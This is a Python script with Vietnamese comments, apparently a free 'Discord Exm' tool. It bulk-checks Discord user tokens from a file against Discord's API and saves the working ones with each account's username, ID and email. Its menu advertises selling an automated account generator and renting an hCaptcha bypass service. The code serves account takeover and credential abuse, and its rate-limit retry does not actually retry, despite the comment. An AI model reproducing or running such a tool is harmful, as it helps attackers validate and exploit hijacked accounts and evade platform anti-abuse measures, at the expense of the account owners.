import requests
import time
import sys
import os
from datetime import datetime

# ANSI color codes cho hiệu ứng 7 màu rainbow
class Colors:
    RED = '\033[91m'
    ORANGE = '\033[38;5;208m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    INDIGO = '\033[38;5;63m'
    VIOLET = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# Gradient colors cho loading bar
RAINBOW_COLORS = [Colors.RED, Colors.ORANGE, Colors.YELLOW, Colors.GREEN, Colors.BLUE, Colors.INDIGO, Colors.VIOLET]

class LoadingBar:
    def __init__(self, total, prefix='Progress', length=40):
        self.total = total
        self.current = 0
        self.prefix = prefix
        self.length = length
        
    def update(self, current, status_text=""):
        self.current = current
        percent = (current / self.total) * 100
        filled_length = int(self.length * current // self.total)
        
        # Tạo gradient bar với 7 màu
        bar = ""
        for i in range(self.length):
            color_index = (i * len(RAINBOW_COLORS)) // self.length
            color = RAINBOW_COLORS[color_index]
            
            if i < filled_length:
                bar += f"{color}█{Colors.RESET}"
            else:
                bar += f"{Colors.DIM}░{Colors.RESET}"
        
        # Tạo phần trăm với màu gradient
        percent_color = RAINBOW_COLORS[min(int(percent / 100 * len(RAINBOW_COLORS)), len(RAINBOW_COLORS) - 1)]
        
        # Clear line và in progress bar
        sys.stdout.write('\r' + ' ' * 100 + '\r')
        progress_line = (f"{Colors.BOLD}{self.prefix}:{Colors.RESET} "
                        f"|{bar}| "
                        f"{percent_color}{percent:5.1f}%{Colors.RESET} "
                        f"{Colors.CYAN}[{current}/{self.total}]{Colors.RESET}")
        
        if status_text:
            progress_line += f" {Colors.WHITE}{status_text}{Colors.RESET}"
            
        sys.stdout.write(progress_line)
        sys.stdout.flush()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_startup_loading():
    """Hiển thị loading screen khi khởi động"""
    clear_screen()
    print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.VIOLET}                  Discord Exm{Colors.RESET}")
    print(f"{Colors.YELLOW}                  ✨ exm.x10.mx ✨{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}🔄 He thong dang tai ! ...{Colors.RESET}")
    
    # Loading bar khởi tạo
    loading = LoadingBar(100, "Loading", 50)
    
    stages = [
        (20, "loading modules..."),
        (40, "checking dependencies..."),
        (60, "colors loading..."),
        (80, "succes..."),
        (100, "ready !")
    ]
    
    current_progress = 0
    for target, message in stages:
        while current_progress <= target:
            loading.update(current_progress, message)
            time.sleep(0.03)
            current_progress += 1
    
    print(f"\n\n{Colors.GREEN}✅ System ready!{Colors.RESET}")
    time.sleep(1)

def print_main_menu():
    """Hiển thị menu chính"""
    clear_screen()
    
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                         {Colors.BOLD}{Colors.VIOLET}Discord Exm{Colors.RESET}{Colors.CYAN}                                  ║
║                        {Colors.YELLOW}✨ exm.x10.mx ✨{Colors.RESET}{Colors.CYAN}                                ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)
    
    # Menu chức năng với alignment chính xác
    menu = f"""
{Colors.BLUE}╭─────────────────────────────────────────────────────────────────────╮
│                       {Colors.BOLD}{Colors.WHITE}EXM TOOL DISCORD FREE{Colors.RESET}{Colors.BLUE}                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  {Colors.GREEN}[1]{Colors.RESET} {Colors.BOLD}Check Token{Colors.RESET}{Colors.BLUE}                                                    │
│  {Colors.RED}[0]{Colors.RESET} {Colors.BOLD}Exit{Colors.RESET}{Colors.BLUE}                                                           │
│                                                                     │
╰─────────────────────────────────────────────────────────────────────╯{Colors.RESET}

{Colors.DIM}{Colors.GREEN}Có bán tool generator account discord auto verify mail + sdt đa luồng hoặc source. {Colors.RESET}
{Colors.DIM}{Colors.GREEN}Cho thuê api bypass hcaptcha 7000 captcha/30k vnd. {Colors.RESET}
"""
    print(menu)

def check_token(token):
    """Kiểm tra xem token Discord có hợp lệ và hoạt động hay không"""
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        
        if response.status_code == 200:
            user_data = response.json()
            username = user_data.get('username', 'N/A')
            user_id = user_data.get('id', 'N/A')
            email = user_data.get('email', 'N/A')
            verified = user_data.get('verified', False)
            
            return {
                'status': 'VALID',
                'username': username,
                'user_id': user_id,
                'email': email,
                'verified': verified
            }
        elif response.status_code == 401:
            return {'status': 'INVALID', 'error': 'Unauthorized - Token không hợp lệ'}
        elif response.status_code == 429:
            return {'status': 'RATE_LIMITED', 'error': 'Rate limited - Quá nhiều request'}
        else:
            return {'status': 'ERROR', 'error': f'HTTP {response.status_code}'}
            
    except requests.exceptions.RequestException as e:
        return {'status': 'ERROR', 'error': f'Network error: {str(e)}'}

def create_live_folder():
    """Tạo thư mục live nếu chưa tồn tại"""
    if not os.path.exists('live'):
        os.makedirs('live')
        print(f"{Colors.GREEN}✅ Đã tạo thư mục 'live'{Colors.RESET}")

def load_tokens_from_file(filename):
    """Đọc tokens từ file với loading animation"""
    print(f"\n{Colors.YELLOW}📂 Đang đọc file {filename}...{Colors.RESET}")
    
    # Loading cho việc đọc file
    loading = LoadingBar(100, "Loading file", 40)
    for i in range(101):
        loading.update(i, f"Reading {filename}")
        time.sleep(0.01)
    
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            tokens = []
            for line in file:
                token = line.strip()
                if token and not token.startswith('#'):  # Bỏ qua comment và dòng trống
                    tokens.append(token)
            
            print(f"\n{Colors.GREEN}✅ Đã đọc thành công {len(tokens)} tokens{Colors.RESET}")
            return tokens
    except FileNotFoundError:
        print(f"\n{Colors.RED}❌ Không tìm thấy file {filename}{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Vui lòng tạo file tokens.txt và đặt tokens vào đó{Colors.RESET}")
        return None
    except Exception as e:
        print(f"\n{Colors.RED}❌ Lỗi đọc file: {str(e)}{Colors.RESET}")
        return None

def check_tokens_function():
    """Chức năng [1] - Check Token"""
    clear_screen()
    print(f"{Colors.BOLD}{Colors.GREEN}🔍 CHỨC NĂNG CHECK TOKEN{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*50}{Colors.RESET}\n")
    
    # Tạo thư mục live
    create_live_folder()
    
    # Đọc tokens từ file
    tokens = load_tokens_from_file('tokens.txt')
    if not tokens:
        input(f"\n{Colors.YELLOW}Nhấn Enter để quay lại menu...{Colors.RESET}")
        return
    
    print(f"\n{Colors.BOLD}{Colors.BLUE}🚀 Bắt đầu kiểm tra {len(tokens)} tokens...{Colors.RESET}")
    print(f"{Colors.DIM}💾 Live tokens sẽ được lưu vào: live/livetokens.txt{Colors.RESET}\n")
    time.sleep(2)
    
    live_tokens = []
    dead_tokens = []
    
    # Progress bar chính
    progress = LoadingBar(len(tokens), "Checking tokens", 50)
    
    for i, token in enumerate(tokens):
        # Hiển thị token preview
        token_preview = f"{token[:15]}...{token[-10:]}" if len(token) > 25 else token
        progress.update(i, f"Token: {token_preview}")
        
        result = check_token(token)
        
        print(f"\n{Colors.DIM}[{i+1:03d}/{len(tokens):03d}]{Colors.RESET} ", end="")
        
        if result['status'] == 'VALID':
            print(f"{Colors.GREEN}✅ LIVE{Colors.RESET} - {Colors.BOLD}{result['username']}{Colors.RESET} "
                  f"{Colors.DIM}(ID: {result['user_id']}){Colors.RESET}")
            
            if result['email'] != 'N/A':
                verified_icon = "✅" if result['verified'] else "❌"
                print(f"   {Colors.CYAN}📧 {result['email']} {verified_icon}{Colors.RESET}")
            
            # Lưu thông tin chi tiết
            live_tokens.append({
                'token': token,
                'username': result['username'],
                'user_id': result['user_id'],
                'email': result['email'],
                'verified': result['verified']
            })
            
        elif result['status'] == 'INVALID':
            print(f"{Colors.RED}❌ DEAD{Colors.RESET} - {Colors.DIM}{result['error']}{Colors.RESET}")
            dead_tokens.append(token)
            
        elif result['status'] == 'RATE_LIMITED':
            print(f"{Colors.YELLOW}⏳ RATE LIMITED{Colors.RESET} - {Colors.DIM}Chờ 5 giây...{Colors.RESET}")
            # Mini progress bar cho rate limit
            rate_limit_bar = LoadingBar(50, "Cooldown", 30)
            for j in range(51):
                rate_limit_bar.update(j, f"Wait {5-j//10}s")
                time.sleep(0.1)
            print()
            # Thử lại token này (giảm i để không bỏ qua token)
            continue
            
        else:
            print(f"{Colors.ORANGE}⚠️ ERROR{Colors.RESET} - {Colors.DIM}{result['error']}{Colors.RESET}")
            dead_tokens.append(token)
        
        # Delay để tránh rate limit
        time.sleep(0.5)
    
    # Hoàn thành progress bar
    progress.update(len(tokens), "Completed!")
    
    # Lưu live tokens vào file
    if live_tokens:
        print(f"\n\n{Colors.YELLOW}💾 Đang lưu {len(live_tokens)} live tokens...{Colors.RESET}")
        
        save_progress = LoadingBar(100, "Saving", 40)
        for i in range(101):
            save_progress.update(i, "Writing to live/livetokens.txt")
            time.sleep(0.01)
        
        try:
            with open('live/livetokens.txt', 'w', encoding='utf-8') as f:
                f.write("# Discord Live Tokens\n")
                f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total: {len(live_tokens)} live tokens\n\n")
                
                for token_info in live_tokens:
                    # Ghi token với thông tin comment
                    f.write(f"{token_info['token']} # {token_info['username']} | {token_info['user_id']}")
                    if token_info['email'] != 'N/A':
                        f.write(f" | {token_info['email']}")
                    f.write("\n")
            
            print(f"\n{Colors.GREEN}✅ Đã lưu thành công vào live/livetokens.txt{Colors.RESET}")
            
        except Exception as e:
            print(f"\n{Colors.RED}❌ Lỗi lưu file: {str(e)}{Colors.RESET}")
    
    # Hiển thị kết quả tổng kết
    print(f"\n\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.VIOLET}                  📊 KẾT QUẢ KIỂM TRA                   {Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    
    total_checked = len(live_tokens) + len(dead_tokens)
    live_percent = (len(live_tokens) / total_checked * 100) if total_checked > 0 else 0
    
    print(f"{Colors.GREEN}✅ Live tokens:  {Colors.BOLD}{len(live_tokens):4d}{Colors.RESET} "
          f"{Colors.DIM}({live_percent:.1f}%){Colors.RESET}")
    print(f"{Colors.RED}❌ Dead tokens:  {Colors.BOLD}{len(dead_tokens):4d}{Colors.RESET} "
          f"{Colors.DIM}({100-live_percent:.1f}%){Colors.RESET}")
    
    if live_tokens:
        print(f"\n{Colors.CYAN}📁 File location: {Colors.BOLD}live/livetokens.txt{Colors.RESET}")
        print(f"{Colors.DIM}💡 Bạn có thể sử dụng file này cho các mục đích khác{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{Colors.GREEN}🎉 HOÀN THÀNH! 🎉{Colors.RESET}")
    input(f"{Colors.DIM}Nhấn Enter để quay lại menu...{Colors.RESET}")

def main():
    # Hiển thị loading screen
    show_startup_loading()
    
    while True:
        print_main_menu()
        
        try:
            choice = input(f"\n{Colors.BOLD}{Colors.WHITE}Chọn chức năng: {Colors.RESET}")
            
            if choice == '1':
                check_tokens_function()
            elif choice == '0':
                clear_screen()
                print(f"\n{Colors.BOLD}{Colors.GREEN}👋 Cảm ơn bạn đã sử dụng Discord Token Checker!{Colors.RESET}")
                print(f"{Colors.CYAN}🌈 See you next time!{Colors.RESET}\n")
                break
            else:
                print(f"{Colors.RED}❌ Lựa chọn không hợp lệ! Vui lòng chọn 1 hoặc 0.{Colors.RESET}")
                time.sleep(2)
                
        except KeyboardInterrupt:
            clear_screen()
            print(f"\n{Colors.YELLOW}⏹️ Đã dừng chương trình!{Colors.RESET}")
            break

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n{Colors.RED}❌ Lỗi không mong muốn: {str(e)}{Colors.RESET}")
        input(f"{Colors.DIM}Nhấn Enter để thoát...{Colors.RESET}")